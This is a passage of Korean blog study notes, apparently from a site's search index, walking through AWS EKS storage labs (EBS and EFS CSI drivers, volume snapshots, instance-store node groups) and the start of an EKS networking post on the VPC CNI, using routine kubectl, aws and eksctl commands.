AmazonEKS_EBS_CSI_DriverRole # ISRA 확인 kubectl get sa -n kube-system ebs-csi-controller-sa -o yaml | head -5 eksctl get iamserviceaccount --cluster myeks # 확인 eksctl get addon --cluster ${CLUSTER_NAME} kubectl get deploy,ds -l=app.kubernetes.io/name=aws-ebs-csi-driver -n kube-system kubectl get pod -n kube-system -l \u0026#39;app in (ebs-csi-controller,ebs-csi-node)\u0026#39; kubectl get pod -n kube-system -l app.kubernetes.io/component=csi-driver # ebs-csi-controller 파드에 6개 컨테이너 확인 kubectl get pod -n kube-system -l app=ebs-csi-controller -o jsonpath=\u0026#39;{.items[0].spec.containers[*].name}\u0026#39; ; echo ebs-plugin csi-provisioner csi-attacher csi-snapshotter csi-resizer liveness-probe # gp3 스토리지 클래스 생성 kubectl get sc cat \u0026lt;\u0026lt;EOT \u0026gt; gp3-sc.yaml kind: StorageClass apiVersion: storage.k8s.io/v1 metadata: name: gp3 allowVolumeExpansion: true provisioner: ebs.csi.aws.com volumeBindingMode: WaitForFirstConsumer parameters: type: gp3 allowAutoIOPSPerGBIncrease: \u0026#39;true\u0026#39; encrypted: \u0026#39;true\u0026#39; #fsType: ext4 # 기본값이 ext4 이며 xfs 등 변경 가능 \u0026gt;\u0026gt; 단 스냅샷 경우 ext4를 기본으로하여 동작하여 xfs 사용 시 문제가 될 수 있음 - 테스트해보자 EOT kubectl apply -f gp3-sc.yaml kubectl get sc kubectl describe sc gp3 | grep Parameters 3-2. PVC/PV 파드 테스트 PV YAML을 따로 준비하지 않아도 PVC에 의해 PV가 생성을 확인 nodeAffinity: {matchExpressions: {key: topology.ebs.csi.aws.com/zone}} 구조 topology.ebs.csi.aws.com/zone 라벨이 있는 워커노드에 연결 # 워커노드의 EBS 볼륨 확인 : tag(키/값) 필터링 aws ec2 describe-volumes --filters Name=tag:Name,Values=$CLUSTER_NAME-ng1-Node --output table aws ec2 describe-volumes --filters Name=tag:Name,Values=$CLUSTER_NAME-ng1-Node --query \u0026#34;Volumes[].{VolumeId: VolumeId, VolumeType: VolumeType, InstanceId: Attachments[0].InstanceId, State: Attachments[0].State}\u0026#34; | jq # 워커노드에서 파드에 추가한 EBS 볼륨 확인 aws ec2 describe-volumes --filters Name=tag:ebs.csi.aws.com/cluster,Values=true --output table aws ec2 describe-volumes --filters Name=tag:ebs.csi.aws.com/cluster,Values=true --query \u0026#34;Volumes[].{VolumeId: VolumeId, VolumeType: VolumeType, InstanceId: Attachments[0].InstanceId, State: Attachments[0].State}\u0026#34; | jq # 워커노드에서 파드에 추가한 EBS 볼륨 모니터링 준비 while true; do aws ec2 describe-volumes --filters Name=tag:ebs.csi.aws.com/cluster,Values=true --query \u0026#34;Volumes[].{VolumeId: VolumeId, VolumeType: VolumeType, InstanceId: Attachments[0].InstanceId, State: Attachments[0].State}\u0026#34; --output text; date; sleep 1; done # PVC 생성 cat \u0026lt;\u0026lt;EOT \u0026gt; awsebs-pvc.yaml apiVersion: v1 kind: PersistentVolumeClaim metadata: name: ebs-claim spec: accessModes: - ReadWriteOnce resources: requests: storage: 4Gi storageClassName: gp3 EOT kubectl apply -f awsebs-pvc.yaml kubectl get pvc,pv # 파드 생성 cat \u0026lt;\u0026lt;EOT \u0026gt; awsebs-pod.yaml apiVersion: v1 kind: Pod metadata: name: app spec: terminationGracePeriodSeconds: 3 containers: - name: app image: centos command: [\u0026#34;/bin/sh\u0026#34;] args: [\u0026#34;-c\u0026#34;, \u0026#34;while true; do echo \\$(date -u) \u0026gt;\u0026gt; /data/out.txt; sleep 5; done\u0026#34;] volumeMounts: - name: persistent-storage mountPath: /data volumes: - name: persistent-storage persistentVolumeClaim: claimName: ebs-claim EOT kubectl apply -f awsebs-pod.yaml kubectl get VolumeAttachment # 추가된 EBS 볼륨 상세 정보 확인 aws ec2 describe-volumes --volume-ids $(kubectl get pv -o jsonpath=\u0026#34;{.items[0].spec.csi.volumeHandle}\u0026#34;) | jq # PV 상세 확인 : nodeAffinity kubectl get pv -o yaml | yh kubectl get node --label-columns=topology.ebs.csi.aws.com/zone,topology.kubernetes.io/zone kubectl describe node | more # 파일 내용 추가 저장 확인 kubectl exec app -- tail -f /data/out.txt # 아래 명령어는 확인까지 다소 시간이 소요됨 kubectl df-pv ## 파드 내에서 볼륨 정보 확인 kubectl exec -it app -- sh -c \u0026#39;df -hT --type=overlay\u0026#39; kubectl exec -it app -- sh -c \u0026#39;df -hT --type=ext4\u0026#39; 3-3. 볼륨 증가 테스트 당연한 이야기지만, 줄이는 건 안됨: 새로 작은거 만들어서 옮기면 된다. 하드디스크 조각 모음을 생각해보자 # 현재 pv 의 이름을 기준하여 4G \u0026gt; 10G 로 증가 : .spec.resources.requests.storage의 4Gi 를 10Gi로 변경 kubectl get pvc ebs-claim -o jsonpath={.spec.resources.requests.storage} ; echo kubectl get pvc ebs-claim -o jsonpath={.status.capacity.storage} ; echo kubectl patch pvc ebs-claim -p \u0026#39;{\u0026#34;spec\u0026#34;:{\u0026#34;resources\u0026#34;:{\u0026#34;requests\u0026#34;:{\u0026#34;storage\u0026#34;:\u0026#34;10Gi\u0026#34;}}}}\u0026#39; # 확인 : 볼륨 용량 수정 반영이 되어야 되니, 수치 반영이 조금 느릴수 있다 kubectl exec -it app -- sh -c \u0026#39;df -hT --type=ext4\u0026#39; kubectl df-pv aws ec2 describe-volumes --volume-ids $(kubectl get pv -o jsonpath=\u0026#34;{.items[0].spec.csi.volumeHandle}\u0026#34;) | jq # 자원 삭제 kubectl delete pod app \u0026amp; kubectl delete pvc ebs-claim 4. AWS Volume SnapShots Controller 개인적으로는 신선하게 다가왔다. 평소에는 EC2를 통으로 AMI 백업하는 식으로 진행했었음 4-1. Volumesnapshots Controller 설치 # Install Snapshot CRDs curl -s -O https://raw.githubusercontent.com/kubernetes-csi/external-snapshotter/master/client/config/crd/snapshot.storage.k8s.io_volumesnapshots.yaml curl -s -O https://raw.githubusercontent.com/kubernetes-csi/external-snapshotter/master/client/config/crd/snapshot.storage.k8s.io_volumesnapshotclasses.yaml curl -s -O https://raw.githubusercontent.com/kubernetes-csi/external-snapshotter/master/client/config/crd/snapshot.storage.k8s.io_volumesnapshotcontents.yaml kubectl apply -f snapshot.storage.k8s.io_volumesnapshots.yaml,snapshot.storage.k8s.io_volumesnapshotclasses.yaml,snapshot.storage.k8s.io_volumesnapshotcontents.yaml kubectl get crd | grep snapshot kubectl api-resources | grep snapshot # Install Common Snapshot Controller curl -s -O https://raw.githubusercontent.com/kubernetes-csi/external-snapshotter/master/deploy/kubernetes/snapshot-controller/rbac-snapshot-controller.yaml curl -s -O https://raw.githubusercontent.com/kubernetes-csi/external-snapshotter/master/deploy/kubernetes/snapshot-controller/setup-snapshot-controller.yaml kubectl apply -f rbac-snapshot-controller.yaml,setup-snapshot-controller.yaml kubectl get deploy -n kube-system snapshot-controller kubectl get pod -n kube-system -l app=snapshot-controller # Install Snapshotclass curl -s -O https://raw.githubusercontent.com/kubernetes-sigs/aws-ebs-csi-driver/master/examples/kubernetes/snapshot/manifests/classes/snapshotclass.yaml kubectl apply -f snapshotclass.yaml kubectl get vsclass # volumesnapshotclasses 4-2. Volumesnapshots Controller 테스트 테스트 PVC/파드 생성 및 장애 재현 실습 YAML파일에서 ebs-claim이란 이름을 가진 PVC를 대상으로 하였음 # PVC 생성 kubectl apply -f awsebs-pvc.yaml # 파드 생성 kubectl apply -f awsebs-pod.yaml # 파일 내용 추가 저장 확인 kubectl exec app -- tail -f /data/out.txt # VolumeSnapshot 생성 curl -s -O https://raw.githubusercontent.com/gasida/PKOS/main/3/ebs-volume-snapshot.yaml cat ebs-volume-snapshot.yaml | yh kubectl apply -f ebs-volume-snapshot.yaml # VolumeSnapshot 확인 kubectl get volumesnapshot kubectl get volumesnapshot ebs-volume-snapshot -o jsonpath={.status.boundVolumeSnapshotContentName} ; echo kubectl describe volumesnapshot.snapshot.storage.k8s.io ebs-volume-snapshot kubectl get volumesnapshotcontents # VolumeSnapshot ID 확인 kubectl get volumesnapshotcontents -o jsonpath=\u0026#39;{.items[*].status.snapshotHandle}\u0026#39; ; echo # AWS EBS 스냅샷 확인 aws ec2 describe-snapshots --owner-ids self | jq aws ec2 describe-snapshots --owner-ids self --query \u0026#39;Snapshots[]\u0026#39; --output table # app \u0026amp; pvc 제거 : 강제로 장애 재현 kubectl delete pod app \u0026amp;\u0026amp; kubectl delete pvc ebs-claim 스냅샷 복원 테스트 # 스냅샷에서 PVC 로 복원 kubectl get pvc,pv cat \u0026lt;\u0026lt;EOT \u0026gt; ebs-snapshot-restored-claim.yaml apiVersion: v1 kind: PersistentVolumeClaim metadata: name: ebs-snapshot-restored-claim spec: storageClassName: gp3 accessModes: - ReadWriteOnce resources: requests: storage: 4Gi dataSource: name: ebs-volume-snapshot kind: VolumeSnapshot apiGroup: snapshot.storage.k8s.io EOT cat ebs-snapshot-restored-claim.yaml | yh kubectl apply -f ebs-snapshot-restored-claim.yaml # 확인 kubectl get pvc,pv # 파드 생성 curl -s -O https://raw.githubusercontent.com/gasida/PKOS/main/3/ebs-snapshot-restored-pod.yaml cat ebs-snapshot-restored-pod.yaml | yh kubectl apply -f ebs-snapshot-restored-pod.yaml # 파일 내용 저장 확인 : 파드 삭제 전까지의 저장 기록도 남아있고, 파드 재생성 후 기록도 잘 저장되어있음 kubectl exec app -- cat /data/out.txt # 삭제 kubectl delete pod app \u0026amp;\u0026amp; kubectl delete pvc ebs-snapshot-restored-claim \u0026amp;\u0026amp; kubectl delete volumesnapshots ebs-volume-snapshot 5. AWS EFS Controller GiB(기비바이트) 단위 기준으로 볼륨을 입력했는데 단위 8.0E(엑사바이트)가 뜨는 이유? AWS EFS는 전체 용량 제한이 없음(볼륨 크기 프로비저닝 불필요) (출처: GS Neotek blog) 자동으로 확장되는 \u0026lsquo;페타바이트급\u0026rsquo; 데이터를 저장할 수 있다고 하기 때문에 자신감으로 표현한 것으로 보임 탄력적으로 자동으로 증가하고 줄어들 수 있다고 함 (출처: AWS EFS FAQ) 5-1. AWS EFS Controller 설치 # EFS 정보 확인 aws efs describe-file-systems --query \u0026#34;FileSystems[*].FileSystemId\u0026#34; --output text # IAM 정책 생성 curl -s -O https://raw.githubusercontent.com/kubernetes-sigs/aws-efs-csi-driver/master/docs/iam-policy-example.json aws iam create-policy --policy-name AmazonEKS_EFS_CSI_Driver_Policy --policy-document file://iam-policy-example.json # ISRA 설정 : 고객관리형 정책 AmazonEKS_EFS_CSI_Driver_Policy 사용 eksctl create iamserviceaccount \\ --name efs-csi-controller-sa \\ --namespace kube-system \\ --cluster ${CLUSTER_NAME} \\ --attach-policy-arn arn:aws:iam::${ACCOUNT_ID}:policy/AmazonEKS_EFS_CSI_Driver_Policy \\ --approve # ISRA 확인 kubectl get sa -n kube-system efs-csi-controller-sa -o yaml | head -5 eksctl get iamserviceaccount --cluster myeks # EFS Controller 설치 helm repo add aws-efs-csi-driver https://kubernetes-sigs.github.io/aws-efs-csi-driver/ helm repo update helm upgrade -i aws-efs-csi-driver aws-efs-csi-driver/aws-efs-csi-driver \\ --namespace kube-system \\ --set image.repository=602401143452.dkr.ecr.${AWS_DEFAULT_REGION}.amazonaws.com/eks/aws-efs-csi-driver \\ --set controller.serviceAccount.create=false \\ --set controller.serviceAccount.name=efs-csi-controller-sa # 확인 helm list -n kube-system kubectl get pod -n kube-system -l \u0026#34;app.kubernetes.io/name=aws-efs-csi-driver,app.kubernetes.io/instance=aws-efs-csi-driver\u0026#34; 5-2. (Static provisioning) EFS 파일시스템을 다수의 파드가 사용하게 설정 # 모니터링 watch \u0026#39;kubectl get sc efs-sc; echo; kubectl get pv,pvc,pod\u0026#39; # 실습 코드 clone git clone https://github.com/kubernetes-sigs/aws-efs-csi-driver.git /root/efs-csi cd /root/efs-csi/examples/kubernetes/multiple_pods/specs \u0026amp;\u0026amp; tree # EFS 스토리지클래스 생성 및 확인 cat storageclass.yaml | yh kubectl apply -f storageclass.yaml kubectl get sc efs-sc # PV 생성 및 확인 : volumeHandle을 자신의 EFS 파일시스템ID로 변경 EfsFsId=$(aws efs describe-file-systems --query \u0026#34;FileSystems[*].FileSystemId\u0026#34; --output text) sed -i \u0026#34;s/fs-4af69aab/$EfsFsId/g\u0026#34; pv.yaml cat pv.yaml | yh apiVersion: v1 kind: PersistentVolume metadata: name: efs-pv spec: capacity: storage: 5Gi volumeMode: Filesystem accessModes: - ReadWriteMany persistentVolumeReclaimPolicy: Retain storageClassName: efs-sc csi: driver: efs.csi.aws.com volumeHandle: fs-05699d3c12ef609e2 kubectl apply -f pv.yaml kubectl get pv; kubectl describe pv # PVC 생성 및 확인 cat claim.yaml | yh kubectl apply -f claim.yaml kubectl get pvc # 파드 생성 및 연동 : 파드 내에 /data 데이터는 EFS를 사용 cat pod1.yaml pod2.yaml | yh kubectl apply -f pod1.yaml,pod2.yaml kubectl df-pv # 파드 정보 확인 : PV에 5Gi 와 파드 내에서 확인한 NFS4 볼륨 크기 8.0E의 차이는 무엇? 파드에 6Gi 이상 저장 가능한가? kubectl get pods kubectl exec -ti app1 -- sh -c \u0026#34;df -hT -t nfs4\u0026#34; kubectl exec -ti app2 -- sh -c \u0026#34;df -hT -t nfs4\u0026#34; Filesystem Type Size Used Available Use% Mounted on 127.0.0.1:/ nfs4 8.0E 0 8.0E 0% /data # 공유 저장소 저장 동작 확인 tree /mnt/myefs # 작업용EC2에서 확인 tail -f /mnt/myefs/out1.txt # 작업용EC2에서 확인 kubectl exec -ti app1 -- tail -f /data/out1.txt kubectl exec -ti app2 -- tail -f /data/out2.txt # 쿠버네티스 리소스 삭제 kubectl delete pod app1 app2 kubectl delete pvc efs-claim \u0026amp;\u0026amp; kubectl delete pv efs-pv \u0026amp;\u0026amp; kubectl delete sc efs-sc 5-3. (Dynamic provisioning) EFS 파일시스템을 다수의 파드가 사용하게 설정 5-2처럼 하면, 매 순간 사람의 손이 더 많이 가므로 동적 프로비저닝을 실습 PVC 생성시 {provisioningMode: efs-ap}를 비롯한 파라미터를 추가 AccessPoints를 통해 구현되며, 아직 Fargate 노드는 미지원 # 모니터링 watch \u0026#39;kubectl get sc efs-sc; echo; kubectl get pv,pvc,pod\u0026#39; # EFS 스토리지클래스 생성 및 확인 curl -s -O https://raw.githubusercontent.com/kubernetes-sigs/aws-efs-csi-driver/master/examples/kubernetes/dynamic_provisioning/specs/storageclass.yaml cat storageclass.yaml | yh sed -i \u0026#34;s/fs-92107410/$EfsFsId/g\u0026#34; storageclass.yaml kubectl apply -f storageclass.yaml kubectl get sc efs-sc # PVC/파드 생성 및 확인 curl -s -O https://raw.githubusercontent.com/kubernetes-sigs/aws-efs-csi-driver/master/examples/kubernetes/dynamic_provisioning/specs/pod.yaml cat pod.yaml | yh kubectl apply -f pod.yaml kubectl get pvc,pv,pod # PVC/PV 생성 로그 확인 kubectl logs -n kube-system -l app=efs-csi-controller -c csi-provisioner -f # 파드 정보 확인 kubectl exec -it efs-app -- sh -c \u0026#34;df -hT -t nfs4\u0026#34; Filesystem Type Size Used Available Use% Mounted on 127.0.0.1:/ nfs4 8.0E 0 8.0E 0% /data # 공유 저장소 저장 동작 확인 tree /mnt/myefs # 작업용EC2에서 확인 kubectl exec efs-app -- bash -c \u0026#34;cat data/out\u0026#34; # 쿠버네티스 리소스 삭제 kubectl delete -f pod.yaml kubectl delete -f storageclass.yaml 6. EKS PVs for Instance Store \u0026amp; Add NodeGroup EC2의 인스턴스 스토어는\u0026hellip; ephemeral-storage(임시 볼륨) 웹 콘솔의 EC2 스토리(EBS)정보에 출력되지 않음. 터미널에서 확인. 인스턴스 스토리지의 데이터 손실의 주요한 유형은 아래와 같음. 기본 디스크 드라이브 오류 인스턴스 중지 인스턴스 최대 절전 모드 전환 인스턴스 종료 (출처: AWS Docs) 6-1. 신규 노드 그룹 생성 신규 노드 그룹 ng2를 생성하여 실습 진행 c5d.large의 EC2 인스턴스 스토어(임시 블록 스토리지)를 대상으로 설정 # 인스턴스 스토어 볼륨이 있는 c5 모든 타입의 스토리지 크기 확인 aws ec2 describe-instance-types \\ --filters \u0026#34;Name=instance-type,Values=c5*\u0026#34; \u0026#34;Name=instance-storage-supported,Values=true\u0026#34; \\ --query \u0026#34;InstanceTypes[].[InstanceType, InstanceStorageInfo.TotalSizeInGB]\u0026#34; \\ --output table # 신규 노드 그룹 생성 eksctl create nodegroup --help eksctl create nodegroup -c $CLUSTER_NAME -r $AWS_DEFAULT_REGION --subnet-ids \u0026#34;$PubSubnet1\u0026#34;,\u0026#34;$PubSubnet2\u0026#34;,\u0026#34;$PubSubnet3\u0026#34; --ssh-access \\ -n ng2 -t c5d.large -N 1 -m 1 -M 1 --node-volume-size=30 --node-labels disk=nvme --max-pods-per-node 100 --dry-run \u0026gt; myng2.yaml cat \u0026lt;\u0026lt;EOT \u0026gt; nvme.yaml preBootstrapCommands: - | # Install Tools yum install nvme-cli links tree jq tcpdump sysstat -y # Filesystem \u0026amp; Mount mkfs -t xfs /dev/nvme1n1 mkdir /data mount /dev/nvme1n1 /data # Get disk UUID uuid=\\$(blkid -o value -s UUID mount /dev/nvme1n1 /data) # Mount the disk during a reboot echo /dev/nvme1n1 /data xfs defaults,noatime 0 2 \u0026gt;\u0026gt; /etc/fstab EOT sed -i -n -e \u0026#39;/volumeType/r nvme.yaml\u0026#39; -e \u0026#39;1,$p\u0026#39; myng2.yaml eksctl create nodegroup -f myng2.yaml # 노드 보안그룹 ID 확인 NG2SGID=$(aws ec2 describe-security-groups --filters Name=group-name,Values=*ng2* --query \u0026#34;SecurityGroups[*].[GroupId]\u0026#34; --output text) aws ec2 authorize-security-group-ingress --group-id $NG2SGID --protocol \u0026#39;-1\u0026#39; --cidr 192.168.1.100/32 # 워커 노드 SSH 접속 # 노드 그룹 생성시 나오는 프롬프트에서 노드 ip를 확인할 수 있음 N4=192.168.1.209 ssh ec2-user@$N4 hostname # 확인 ssh ec2-user@$N4 sudo nvme list ssh ec2-user@$N4 sudo lsblk -e 7 -d ssh ec2-user@$N4 sudo df -hT -t xfs ssh ec2-user@$N4 sudo tree /data ssh ec2-user@$N4 sudo cat /etc/fstab # (옵션) max-pod 확인: 100개 kubectl describe node -l disk=nvme | grep Allocatable: -A7 # (옵션) kubelet 데몬 파라미터 확인 : --max-pods=29 --max-pods=100 # 동일 파라미터가 2개 뜨는데, 29는 기본값이고, 100은 노드그룹 생성시 지정한 값임. # 마지막 파라미터에 덧씌워져서 적용되는 것으로 판단. ssh ec2-user@$N4 sudo ps -ef | grep kubelet 6-2. 스토리지 클래스 재생성 및 I/O 테스트 # 기존 삭제 (2-2에서 실습한 내용 초기화) kubectl delete -f local-path-storage.yaml # 경로 변경 opt -\u0026gt; data 후 재생성 sed -i \u0026#39;s/opt/data/g\u0026#39; local-path-storage.yaml kubectl apply -f local-path-storage.yaml # 모니터링 watch \u0026#39;kubectl get pod -owide;echo;kubectl get pv,pvc\u0026#39; ssh ec2-user@$N4 iostat -xmdz 1 -p nvme1n1 # 측정 : Read #curl -s -O https://raw.githubusercontent.com/wikibook/kubepractice/main/ch10/fio-read.fio kubestr fio -f fio-read.fio -s local-path --size 10G --nodeselector disk=nvme # 삭제 kubectl delete -f local-path-storage.yaml eksctl delete nodegroup -c $CLUSTER_NAME -n ng2 reference CloudNet@ Notion 및 Slack 채널 aws-cli filter @AWS Docs k8s volume @조대협님의 블로그 AWS EBS Controller @악분일상님의 블로그 ReadWriteOncePod(RWOP) access mode @k8s Blog AWS EFS ap-northeast-2 region @GS Neotek Blog EFS FAQ @AWS ephemeral-storage @k8s Docs EC2 Instance Store @AWS Docs ","date":"2023-05-12T05:36:38+09:00","permalink":"https://blog.minseong.xyz/post/aws-eks-study-week3/","section":"post","tags":["AWS","EKS","CloudNet@","storage"],"title":"AWS EKS 스터디 3주차 - Storage"},{"categories":null,"contents":"# 아쉽게도 신규 항목인 istio, kube-ops-view는 실습 실패 - istio: `myhome.yaml` 을 어떻게 생성할지 몰라서 중단 - kube-ops-view: A레코드에 제대로 잡히지 않음 지난 1주차에 이어, 이번 주에는 EKS의 네트워크 구성에 대해 알아보는 시간이었습니다.\n직전 스터디에서도 바로 광탈당하나?하며 밤과 주말을 하얗게 불태웠을 정도로\n가장 고난도라고 생각했던 네트워크를 다시 만나니 이제 1% 친근감이 느껴지고 있네요.\n자 그럼 해보도록 합시다.\n1. cloudformation을 활용한 EKS 원클릭 구성 학습을 위해, 이번에도 가시다님이 준비해주신 원클릭 배포 yaml을 활용하여 배포. 완전 배포까지 대략 20분 가량 소요 IAM에서 미리 발급해둔 액세스키/시크릿키를 알아두어야합니다. # 원클릭 셋업 aws cloudformation deploy --template-file ~/Documents/aews/eks-oneclick.yaml --stack-name myeks --parameter-overrides KeyName=aews SgIngressSshCidr=$(curl -s ipinfo.io/ip)/32 MyIamUserAccessKeyID={ACSSKEY|AKIA..} MyIamUserSecretAccessKey={SECUKEY|7ob..} ClusterBaseName=myeks --region ap-northeast-2 # 컨트롤 플레인(마스터노드) 접속 확인 ssh -i ~/.ssh/aews.pem ec2-user@$(aws cloudformation describe-stacks --stack-name myeks --query \u0026#39;Stacks[*].Outputs[0].OutputValue\u0026#39; --output text) 2. AWS VPC CNI w/기본 셋업 (in Control Plane) 네임스페이스는 미리 default로 설정.\n이걸 깜박해서, 지난 스터디 때 헛된 시행착오를 반복했던 이력이 있음. (워커)노드 IP 확인 및 변수 지정\n워커노드는 EKS에서 데이터플레인이라고도 함. eksctl addon으로 설치된 아래 3가지 항목의 정상 설치 확인 codedns kube-proxy vpc-cni 스터디에서는 경이로운(?) AWS VPC CNI를 사용.\nCalico CNI와 달리 데이터플레인(노드)의 AWS ENI(Elastic Network Interface)와 Pod가 같은 네트워크 대역(CIDR)을 사용한다! 예시: eth0(ENI): 10.10.1.1/24 Pod1: 10.10.1.10 Pod2: 10.10.1.20 실제로도 데이터플레인과 Pod가 같은 네트워크 대역을 사용한다.\n(실습해보니 왜 IP까지 동일하지\u0026hellip;? CIDR /32가 걸린건가? 혼란에 빠졌다!) (To-Do) # default 네임스페이스 설정 kubectl ns default # 데이터플레인 IP 확인 및 변수 지정 N1=$(kubectl get node --label-columns=topology.kubernetes.io/zone --selector=topology.kubernetes.io/zone=ap-northeast-2a -o jsonpath={.items[0].status.addresses[0].address}) N2=$(kubectl get node --label-columns=topology.kubernetes.io/zone --selector=topology.kubernetes.io/zone=ap-northeast-2b -o jsonpath={.items[0].status.addresses[0].address}) N3=$(kubectl get node --label-columns=topology.kubernetes.io/zone --selector=topology.kubernetes.io/zone=ap-northeast-2c -o jsonpath={.items[0].status.addresses[0].address}) echo \u0026#34;export N1=$N1\u0026#34; \u0026gt;\u0026gt; /etc/profile echo \u0026#34;export N2=$N2\u0026#34; \u0026gt;\u0026gt; /etc/profile echo \u0026#34;export N3=$N3\u0026#34; \u0026gt;\u0026gt; /etc/profile echo $N1, $N2, $N3 # 데이터플레인 \u0026lt;-\u0026gt; 컨트롤플레인 ssh 접속을 위해 모든 프로토콜 허용 NGSGID=$(aws ec2 describe-security-groups --filters Name=group-name,Values=*ng1* --query \u0026#34;SecurityGroups[*].[GroupId]\u0026#34; --output text) aws ec2 authorize-security-group-ingress --group-id $NGSGID --protocol \u0026#39;-1\u0026#39; --cidr 192.168.1.100/32 # 노드 ssh 접속 확인 ssh ec2-user@$N1 hostname ssh ec2-user@$N2 hostname ssh ec2-user@$N3 hostname # eksctl addon 확인 eksctl get addon --cluster $CLUSTER_NAME # 2023-05-04 19:04:32 [ℹ] Kubernetes version \u0026#34;1.24\u0026#34; in use by cluster \u0026#34;myeks\u0026#34; # 2023-05-04 19:04:32 [ℹ] getting all addons # 2023-05-04 19:04:33 [ℹ] to see issues for an addon run `eksctl get addon --name \u0026lt;addon-name\u0026gt; --cluster \u0026lt;cluster-name\u0026gt;` # NAME VERSION STATUS # coredns v1.9.3-eksbuild.3 ACTIVE # kube-proxy v1.24.10-eksbuild.2 ACTIVE # vpc-cni v1.12.6-eksbuild.1 ACTIVE # AWS VPC CNI 관련 # 각각 노드(데이터플레인)IP 와 Pod IP 확인하는 명령어 aws ec2 describe-instances --query \u0026#34;Reservations[*].Instances[*].{PublicIPAdd:PublicIpAddress,PrivateIPAdd:PrivateIpAddress,InstanceName:Tags[?Key==\u0026#39;Name\u0026#39;]|[0].Value,Status:State.Name}\u0026#34; --filters Name=instance-state-name,Values=running --output table kubectl get pod -n kube-system -o=custom-columns=NAME:.metadata.name,IP:.status.podIP,STATUS:.status.phase # kube-proxy config 확인 (mode: “iptables” 사용) kubectl describe cm -n kube-system kube-proxy-config | grep mode 2-1. kube-proxy에서 ipvs 대신 iptables를 사용하는 이유? 가시다님이 설명하시길 ARP고정이나 가상 인터페이스 이슈 등으로 iptables를 쓰는 것으로 보인다고 하였음.\n더 찾아보니, 해당 이슈는 19년 1월부터 제기되어 왔음.\n참조: AWS-github\n22년 12월에 ipvs에 대한 지원이 GA되었음.\n참조: AWS-blog\nipvs가 iptables보다 나은가?\n해당 내용은 KubeCon Europe 2019에서 발표된 내용에서 언급된다.\n아래와 같이 서비스의 수에 따라 시간복잡도에 의해 발생하는 지연을 줄일 수 있다고 한다. (iptables: O(N), ipvs: O(1)) 3. 데이터플레인(노드)의 네트워크 기본 정보 확인 노드에 tcpdump 등 네트워크 관련 도구를 설치를 하여 확인해본다. k8s CNI : 쿠버네티스의 네트워크 환경을 구성해주는 플러그인 (Container Network Interface) # 각 데이터플레인에 도구 설치 ssh ec2-user@$N1 sudo yum install links tree jq tcpdump -y ssh ec2-user@$N2 sudo yum install links tree jq tcpdump -y ssh ec2-user@$N3 sudo yum install links tree jq tcpdump -y # CNI 정보 확인(비슷비슷하므로 N2만 진행) ssh ec2-user@$N2 tree /var/log/aws-routed-eni ssh ec2-user@$N2 cat /var/log/aws-routed-eni/plugin.log | jq # IP 할당시 CIDR 32 확인 ssh ec2-user@$N2 cat /var/log/aws-routed-eni/ipamd.log | jq # maxENI 5개, 할당된 IP 1개 확인 ssh ec2-user@$N2 cat /var/log/aws-routed-eni/egress-v4-plugin.log | jq # # 네트워크 정보 확인 : eniY는 pod network 네임스페이스와 veth pair ssh ec2-user@$N2 sudo ip -br -c addr ssh ec2-user@$N1 sudo ip -c addr ssh ec2-user@$N2 sudo ip -c route ssh ec2-user@$N1 sudo iptables -t nat -S # iptables 룰 확인 ssh ec2-user@$N2 sudo iptables -t nat -L -n -v 3-1. 데이터플레인의 기본 네트워크 정보 확인: 보조 IPv4 주소 확인 가시다님이 제공해주신 장표와 함께 확인. (coredns Pod 기준)AWS 웹콘솔에서 확인해보면, 2가지 IP가 있음. 프라이빗 주소 IP: 컨트롤데이터플레인의 IP주소 보조 프라이빗 주소 IP: 데이터플레인에 Pod가 생성되면 바로 IP를 붙이기 위해 예약된 IP L(ocal)-IPAM Warm IP Pool 새로운 Pod에 할당할 Pool이 없으면, 새로 ENI(eth1 등)을 만들어서 할당함 (3-3 참조) 스크린샷에서는 veth 페어의 IP 주소는 192.168.2.86임을 확인. # coredns 파드 IP 정보 확인 # 아래 스크린샷을 보면 알듯이 한국 리전 B존의 노드에 생성된 coredns 파드의 IP임을 알 수 있었다. kubectl get pod -n kube-system -l k8s-app=kube-dns -owide # 노드의 라우팅 정보 확인 \u0026gt;\u0026gt; EC2 네트워크 정보의 \u0026#39;보조 프라이빗 IPv4 주소\u0026#39;와 비교 # 웹 콘솔에서 한국 리전 B로 확인했으므로, N2의 정보를 확인. # veth 페어의 IP 주소는 Pod의 IP 주소와 동일함. ssh ec2-user@$N2 sudo ip -c route 3-2. veth(v-eth, virtual ethernet interface) 단어를 보고 단박에 가상eth 인건 알았지만, 자세한 건 아래의 글을 통해서 알 수 있음. 44bits-veth 아래까지 참고한다면, veth의 실제를 알 수 있을 것으로 판단. 44bit-컨테이너 네트워크 기초 2편 3-3. 테스트용 파드 생성 w/netshoot nicolaka/netshoot a.k.a. 네트워크 장애해결용 맥가이버칼 다른 터미널로 데이터플레인 모니터링을 병행 스크린샷을 참조하면 N1에서 처음에 네트워크 인터페이스가 하나 밖에 없다는 것을 알았으므로,\n이번 실습을 통해 네트워크 어댑터가 하나 더 생기는 것을 관찰하기 위해서임 2.에서 생겼던 궁금증이 약간? 해소된 것 같다. # (다른 터미널을 띄워서) 아래와 같이 3개를 모니터링 ssh ec2-user@$N1 watch -d \u0026#34;ip link | egrep \u0026#39;eth|eni\u0026#39; ;echo;echo \u0026#34;[ROUTE TABLE]\u0026#34;; route -n | grep eni\u0026#34; ssh ec2-user@$N2 watch -d \u0026#34;ip link | egrep \u0026#39;eth|eni\u0026#39; ;echo;echo \u0026#34;[ROUTE TABLE]\u0026#34;; route -n | grep eni\u0026#34; ssh ec2-user@$N3 watch -d \u0026#34;ip link | egrep \u0026#39;eth|eni\u0026#39; ;echo;echo \u0026#34;[ROUTE TABLE]\u0026#34;; route -n | grep eni\u0026#34; # 컨트롤플레인에서 netshoot 파드 생성 명령 # 그러면 각 데이터플레인에서 변화가 생기는데 # 이번 경우에는 $N3에서 eth1이 생성됨을 확인할 수 있음 cat \u0026lt;\u0026lt;EOF | kubectl create -f - apiVersion: apps/v1 kind: Deployment metadata: name: netshoot-pod spec: replicas: 3 selector: matchLabels: app: netshoot-pod template: metadata: labels: app: netshoot-pod spec: containers: - name: netshoot-pod image: nicolaka/netshoot command: [\u0026#34;tail\u0026#34;] args: [\u0026#34;-f\u0026#34;, \u0026#34;/dev/null\u0026#34;] terminationGracePeriodSeconds: 0 EOF 4. 데이터플레인(노드)간 통신 확인 AWS VPC CNI를 쓰는 경우, NAT 동작(Overlay) 없이, VPC 내부에서 통신이 가능하다. 데이터플레인에 있는 ENI(eth0 등)을 타고 노드 간 통신을 한다. # 파드 이름 변수 